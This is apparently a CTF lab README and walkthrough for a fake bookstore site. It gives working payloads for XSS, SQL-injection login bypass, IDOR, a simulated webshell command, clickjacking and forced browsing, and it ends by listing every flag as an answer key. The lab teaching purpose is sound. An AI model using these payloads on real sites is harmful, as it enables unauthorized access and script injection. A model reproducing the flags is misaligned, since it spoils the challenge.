# BookTryHackMe
Test your web-hacking skills on a realistic, simulated bookstore website! Explore multiple pages that look and behave like a real app while hunting hidden flags-learn by finding and exploiting common web vulnerabilities, including:

* SQL Injection (SQLi)
* XML External Entity (XXE) simulation
* Insecure Direct Object Reference (IDOR)
* Reflected Cross-Site Scripting (XSS)
* Stored (persistent) XSS
* Unrestricted File Uploads (safe lab simulation)
* Clickjacking (framing)
* Forced browsing / exposed static files


Discover hidden flags by exploiting these vulnerabilities safely in a CTF environment.

---

# BookStore CTF - Detailed Walkthrough (Exploits + Code)

## Flag 001 - Default/Test Credentials (Welcome flag)

**Location:** `GET/POST /login` (Login page)
**Why vulnerable:** Developer/test credentials are left in the page source (HTML comment / leftover).
**How to exploit:**

* Open Login page.
* View page source (Ctrl+U).
* Search for `DEFAULT CREDENTIALS` / `test@example.com` / `Welcome123`.
* Use found credentials to log in.
  **Example creds (lab):**

```
test@example.com
Welcome123
```

**Expected result:** `THM{welcome_flag_001}`

---

## Flag 002 - IDOR (Hidden profile)

**Location:** `GET /profile?id=<id>`
**Why vulnerable:** Server returns profile based only on numeric `id` parameter without verifying requester ownership.
**How to exploit:**

* Log in with any account.
* Open your profile `/profile?id=1`.
* Change URL to `/profile?id=99` and reload.
  **Expected result:** `THM{idor_hidden_flag_002}`

---

## Flag 003 - Stored XSS (Review form)

**Location:** `POST /book?id=<n>` (review form on a book page)
**Why vulnerable:** Review input is stored and later rendered unsanitized (persistent XSS).
**How to exploit (payload examples):**

* Submit review text containing a payload, e.g.:

```html
<img src=x onerror=alert('xss')>
```

or

```html
<script>alert('xss')</script>
```

* Open the book page in a different session or reload — payload executes.
  **Expected result (lab triggers flag when payload detected):** `THM{stored_xss_flag_003}`

---

## Flag 004 - Reflected XSS (Search page, Burp bypass)

**Location:** `GET /search?query=...`
**Why vulnerable:** The `query` param is reflected into the page without proper encoding; naive filters block `<script>` but can be bypassed via encoding/event attributes.
**How to exploit (use Burp / URL encode):**

* Capture `GET /search?query=term` in Burp Proxy → send to Repeater.
* Replace `query` with a URL-encoded event payload, e.g.:

```
%3Cimg%20src%3Dx%20onerror%3Dalert('xss')%3E
```

* Replay request and view page — payload executes.
  **Alternate bypass:** use `onmouseover` in an `<a>` tag encoded.
  **Expected result:** `THM{reflected_xss_flag_04}`

---

## Flag 005 - Unrestricted File Upload (Simulated webshell exec)

**Location:** `POST /upload_profile` (uploads saved to `/static/uploads/`) and `/uploads/exec/<file>?cmd=...` (simulated exec)
**Why vulnerable:** App allows uploads to web-served directory and provides a simulated exec endpoint that reads files. (In lab, execution is simulated for safety.)
**How to exploit:**

1. Upload file via profile upload form (e.g., name it `myshell.php` or `myshell.txt`).
2. Confirm reachability: `https://<HOST>/uploads/myshell.php`
3. Call simulated exec endpoint:

```
http://<HOST>/uploads/exec/myshell.php?cmd=cat%20/opt/flag_shell.txt
```

**Expected result:** `THM{shell_flag_05}`

---

## Flag 006 - Clickjacking (Index framing)

**Location:** Home page `/` (index)
**Why vulnerable:** Page can be framed — missing `X-Frame-Options` / `Content-Security-Policy: frame-ancestors`. The app detects being framed and shows the flag.
**How to exploit (local attacker page):** create `attack.html`:

```html
<!doctype html>
<html>
  <body>
    <iframe src="http://<HOST>/" style="width:1000px;height:800px;border:0"></iframe>
  </body>
</html>
```

* Open `attack.html` in browser (file:// or local http server).
  **Tip:** Use Firefox if Chrome blocks embedding.
  **Expected result:** `THM{clickjack_flag_06}`

---

## Flag 007 - SQL Injection (Login simulation)

**Location:** `POST /login` (login form)
**Why vulnerable:** Lab simulates unsafe string concatenation in SQL queries (demonstration branch detects classic SQLi).
**How to exploit (payload):**

* Email or password field:

```
' OR '1'='1
```

* Submit form.
  **Why it works:** The payload makes the login WHERE clause always true. (CTF detects SQLi pattern and returns flag.)
  **Expected result:** `THM{SQLi_successful}`

---

## Flag 009 - Forced Browsing / Sensitive static file

**Location:** `/static/admin/flag.txt` (or similar common admin static paths)
**Why vulnerable:** Sensitive file(s) left in webroot and accessible without authentication.
**How to exploit (forced browse / curl):**

```
curl -v https://<HOST>/static/admin/flag.txt
```

or just visit `https://<HOST>/static/admin/flag.txt` in browser.
**Expected result:** `THM{Final_hidden_flag_09}`

---

Collect all individual flags:

```
THM{welcome_flag_001}

THM{idor_hidden_flag_002}

THM{stored_xss_flag_003}

THM{reflected_xss_flag_04}

THM{shell_flag_05}

THM{clickjack_flag_06}

THM{SQLi_successful}

THM{Final_hidden_flag_09}
```
